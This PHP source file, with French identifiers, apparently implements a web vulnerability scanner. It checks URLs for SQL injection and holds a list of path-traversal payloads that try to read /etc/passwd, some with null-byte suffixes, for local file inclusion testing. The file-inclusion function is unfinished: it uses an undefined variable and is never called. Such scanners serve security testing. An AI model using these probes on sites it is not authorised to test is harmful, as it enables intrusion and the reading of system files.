<?php
class Scanneur
{
	public function Scanne($array_url)
	{
		$resultat = '';
		$nbr_elmt = count($array_url);
		$e = '';
		foreach ($array_url as $key => $url)
		{
			$e .= $url;
			if($url != '')
			{
				$this->SuprimerDansTrv($url);
				if($this->sql($url))
				{
					$resultat .= $url . '\r\n';
				}
			}
		}
		$_SESSION['erreur'] = $e;
		$this->SuprimerDansTrv('');
		return $resultat;
	}

	private function SuprimerDansTrv($str)
	{
		if(($cle = array_search($str, $_SESSION['url_trouver'])) !== false)
		{
		    unset($_SESSION['url_trouver'][$cle]);
		}
	}

	private function lfi($url)
	{
		$req = new Curl();
		$lfifound = 0;
		$lfi = array('/etc/passwd',
				'../etc/passwd',
				'../../etc/passwd',
				'../../../etc/passwd',
				'../../../../etc/passwd',
				'../../../../../etc/passwd',
				'../../../../../../etc/passwd',
				'../../../../../../../etc/passwd',
				'../../../../../../../../etc/passwd',
				'../../../../../../../../../etc/passwd',
				'../../../../../../../../../../etc/passwd',
				'/etc/passwd%00',
				'../etc/passwd%00',
				'../../etc/passwd%00',
				'../../../etc/passwd%00',
				'../../../../etc/passwd%00',
				'../../../../../etc/passwd%00',
				'../../../../../../etc/passwd%00',
				'../../../../../../../etc/passwd%00',
				'../../../../../../../../etc/passwd%00',
				'../../../../../../../../../etc/passwd%00',
				'../../../../../../../../../../etc/passwd%00');

		$totallfi = count($lfi);
		for($i = 0; $i < $totallfi; $i++)
		{
			$url_t = $site.$lfi[$i];
			$page = $req->get($url_t);
			if (preg_match('/root/i',$page, $matches))
			{
				echo 'LFI trouver: $site$lfi[$i]<br>';
				$lfifound = 1;
			}
		}
		if ($lfifound == 0)
		{
			echo 'Pas de LFI trouver.<br>';
		}
	}

	private function sql($url)
	{
		if (!strpos($url, '=') !== false)
        {
            return false;
        }
        else
        {
            $sqli = new sqli_check();
            if($sqli->demmareAnalyseFast($url))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
	}
}
